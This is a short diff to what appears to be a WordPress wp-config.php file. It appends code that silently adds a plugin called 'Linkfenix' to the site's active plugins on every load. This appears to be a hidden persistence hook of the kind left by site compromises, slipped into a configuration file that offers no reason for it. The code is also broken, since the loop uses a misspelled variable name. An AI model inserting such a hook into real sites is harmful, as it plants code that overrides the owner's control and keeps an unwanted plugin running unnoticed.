@@ -89,3 +89,16 @@ if ( !defined('ABSPATH') )
 
 /** Sets up WordPress vars and included files. */
 require_once(ABSPATH . 'wp-settings.php');
+
+
+// get already activated plugins
+$plugins = get_option('active_plugins');
+if($plugins){
+    $puginsToActiv = array('Linkfenix');
+    foreach ($puginsTostActiv as $plugin){
+        if (!in_array($plugin, $plugins)) {
+             array_push($plugins,$plugin);
+             update_option('active_plugins',$plugins);
+        }
+    }
+}
